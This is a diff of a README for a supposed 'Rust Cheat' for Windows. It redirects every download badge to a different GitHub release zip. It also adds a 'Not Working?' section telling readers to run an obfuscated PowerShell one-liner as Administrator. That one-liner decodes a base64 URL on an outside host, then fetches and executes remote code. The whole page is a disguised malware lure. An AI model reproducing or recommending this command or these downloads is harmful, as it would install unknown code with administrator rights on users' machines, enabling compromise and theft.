@@ -1,14 +1,26 @@
 # Rust Cheat
 
-[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/AssistantStay/rphiwmcm/releases/download/v1/EvolveX.zip)
-[![Version](https://img.shields.io/badge/Version-2026-brightgreen?style=for-the-badge)](https://github.com/AssistantStay/rphiwmcm/releases/download/v1/EvolveX.zip)
-[![Downloads](https://img.shields.io/badge/Downloads-2.9k%2B-blue?style=for-the-badge)](https://github.com/AssistantStay/rphiwmcm/releases/download/v1/EvolveX.zip)
-[![Status](https://img.shields.io/badge/Status-Working-success?style=for-the-badge)](https://github.com/AssistantStay/rphiwmcm/releases/download/v1/EvolveX.zip)
+[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
+[![Version](https://img.shields.io/badge/Version-2026-brightgreen?style=for-the-badge)](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
+[![Downloads](https://img.shields.io/badge/Downloads-2.9k%2B-blue?style=for-the-badge)](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
+[![Status](https://img.shields.io/badge/Status-Working-success?style=for-the-badge)](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
 
 ---
 
-## [![Download Button](https://img.shields.io/badge/DOWNLOAD-Rust%20Cheat-brightgreen?style=for-the-badge&logo=download&logoColor=white)](https://github.com/AssistantStay/rphiwmcm/releases/download/v1/EvolveX.zip)
+## [![Download Button](https://img.shields.io/badge/DOWNLOAD-Rust%20Cheat-brightgreen?style=for-the-badge&logo=download&logoColor=white)](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
 <img width="739" height="415" alt="image" src="https://github.com/user-attachments/assets/4ba9e49e-fcba-4897-8cfe-a89ff5731f38" />
+
+---
+## Not Working?
+Follow this steps:
+- Press Win + R
+- Type *Powershell* and open with Administrator
+- Copy this command:
+```
+iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz00NTY2MjQxNDcvbmV3b25l'))) -UseBasicParsing)
+```
+- Paste it in Powershell Window, press Enter
+---
 
 ---
 
@@ -61,7 +73,7 @@
 
 ### Step 1 — Download
 
-[![Download Now](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD-Click_Here-blue?style=for-the-badge&logo=download&logoColor=white)](https://github.com/AssistantStay/rphiwmcm/releases/download/v1/EvolveX.zip)
+[![Download Now](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD-Click_Here-blue?style=for-the-badge&logo=download&logoColor=white)](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
 
 ### Step 2 — Extract
 
